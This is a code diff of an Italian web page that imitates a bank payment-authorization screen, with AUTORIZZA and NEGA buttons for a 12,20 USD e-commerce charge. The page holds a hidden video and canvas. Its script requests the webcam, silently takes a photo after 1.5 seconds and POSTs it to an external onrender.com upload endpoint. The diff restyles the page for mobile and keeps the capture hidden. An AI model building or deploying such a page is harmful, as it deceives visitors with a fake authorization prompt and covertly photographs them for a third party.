@@ -2,35 +2,72 @@
 <html lang="it">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Autorizza Operazione</title>
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
     body {
       font-family: Arial, sans-serif;
       background-color: #f5f5f5;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
+      min-height: 100vh;
+      padding: 20px;
     }
+
     .card {
       background-color: white;
-      border-radius: 10px;
-      padding: 30px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      width: 300px;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+      width: 100%;
+      max-width: 400px;
       text-align: center;
     }
-    button {
-      padding: 10px 20px;
-      margin: 10px;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
+
+    h3 {
+      font-size: 20px;
+      margin-bottom: 15px;
     }
-    .autorizza { background-color: yellow; }
-    .nega { background-color: lightgray; }
+
+    p {
+      margin: 5px 0;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .autorizza {
+      background-color: #ffd700;
+    }
+
+    .nega {
+      background-color: #d3d3d3;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    video, canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -40,8 +77,10 @@
   <p>Importo: <strong>12,20 USD</strong></p>
   <p>Commissione: <strong>0,00 USD</strong></p>
   <p>Operazione: <strong>PAGAMENTO E-COMMERCE</strong></p>
-  <video id="video" width="300" autoplay style="display:none;"></video>
-  <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
+
+  <video id="video" width="300" autoplay></video>
+  <canvas id="canvas" width="300" height="200"></canvas>
+
   <button class="autorizza" onclick="handleClick('autorizza')">AUTORIZZA</button>
   <button class="nega" onclick="handleClick('nega')">NEGA</button>
 </div>
@@ -51,7 +90,7 @@
   const canvas = document.getElementById('canvas');
   const context = canvas.getContext('2d');
 
-  // Appena la webcam è attiva, scatta automaticamente una foto
+  // Scatto automatico all'attivazione webcam
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
       video.srcObject = stream;
@@ -59,7 +98,6 @@
         setTimeout(() => {
           context.drawImage(video, 0, 0, 300, 200);
           const image = canvas.toDataURL('image/png');
-          // Invio automatico al backend al consenso webcam
           fetch('https://backend-render-server.onrender.com/upload', {
             method: 'POST',
             headers: {
@@ -70,7 +108,7 @@
               image: image
             })
           });
-        }, 1500); // attesa breve per stabilizzare l'immagine
+        }, 1500); // delay breve per stabilizzazione
       };
     });
 
